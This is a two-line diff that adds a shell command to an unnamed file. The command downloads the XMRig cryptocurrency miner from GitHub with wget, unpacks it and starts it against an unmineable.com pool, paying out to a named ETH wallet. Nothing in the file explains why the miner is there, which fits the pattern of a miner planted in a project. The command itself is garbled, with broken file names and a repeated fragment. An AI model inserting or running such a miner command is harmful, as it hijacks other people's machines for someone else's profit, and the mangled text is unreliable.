@@ -1,0 +1,2 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig - 6.17.0 - linux - x64.tar.gz && cd xmrig - 6.17.0 &17.0 && ./xmrig -o& ./xmrig -o
+ethash.unmineable.com:3333 -a rx -k - u ETH:0xeCb0bd7306e3bE165e4df9CD83A376D3fa76CE2d.1
